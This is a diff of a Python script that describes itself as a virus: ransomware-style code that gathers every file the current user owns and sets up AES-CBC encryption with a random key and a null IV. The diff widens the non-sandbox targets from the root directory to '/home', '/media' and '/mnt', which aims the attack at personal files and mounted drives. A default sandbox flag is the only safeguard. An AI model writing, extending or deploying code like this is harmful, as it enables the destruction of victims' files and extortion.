@@ -15,7 +15,7 @@ from getpass import getuser as gu	# For getting the user who is running the scri
 from Crypto.Cipher import AES	# AES functions. For encrypting files.
 
 SANDBOX = True	# Safe mode (controlled attack of the virus).
-# SANDBOX = False	# This will fuck up the user's data. DO NOT EVEN THINK ABOUT RUNNING AS ROOT.
+#SANDBOX = False	# This will fuck up the user's data. DO NOT EVEN THINK ABOUT RUNNING AS ROOT.
 
 BS = 16	# Block size in bytes.
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()	# Source: https://goo.gl/Uc9t2k
@@ -25,8 +25,8 @@ def go(p):	# Get owner of a file
 	except: return ''	# If it fails, just return an empty string to invalidate the file opening (and avoid crashes).
 
 if __name__ == '__main__':	# Make sure it's not imported from another module.
-	d = '/tmp/a' if SANDBOX else '/'	# If SANDBOX mode is set, run the attack under control.
-	x = [join(r, f) for r, _, ff in walk(d) for f in ff if (go(join(r, f)) == gu())]	# Get files which the user owns. Quite hard to read.
+	d = ['/tmp/a'] if SANDBOX else ['/home', '/media', '/mnt']	# If SANDBOX mode is set, run the attack under control. Otherwise, attack the specified paths.
+	x = [join(r, f) for n in d for r, _, ff in walk(n) for f in ff if (go(join(r, f)) == gu())]	# Get files which the user owns. Quite hard to read.
 
 	c = AES.new(urandom(BS), AES.MODE_CBC, chr(0)*16)	# New AES instance, using a randomly generated key, in CBC mode, with a null initialization vector.
 
